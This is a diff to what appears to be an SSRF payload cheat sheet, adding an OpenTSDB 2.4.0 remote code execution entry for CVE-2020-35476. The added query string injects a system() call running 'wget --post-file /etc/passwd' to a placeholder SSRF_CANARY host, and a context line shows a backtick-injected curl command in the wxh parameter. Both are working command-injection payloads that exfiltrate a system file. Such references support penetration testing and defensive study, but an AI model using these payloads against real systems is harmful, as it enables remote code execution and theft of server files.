@@ -480,6 +480,14 @@ Taken from [here](https://blog.safebuff.com/2016/07/03/SSRF-Tips/).
 /q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60curl%20SSRF_CANARY%60&style=linespoint&png
 ```
 
+[OpenTSDB 2.4.0 Remote Code Execution](https://github.com/OpenTSDB/opentsdb/issues/2051)
+
+**SSRF Canary: curl via RCE - CVE-2020-35476**
+
+```bash
+/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('wget%20--post-file%20/etc/passwd%20SSRF_CANARY')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
+```
+
 <div id="jenkins"></div>
 
 ## Jenkins
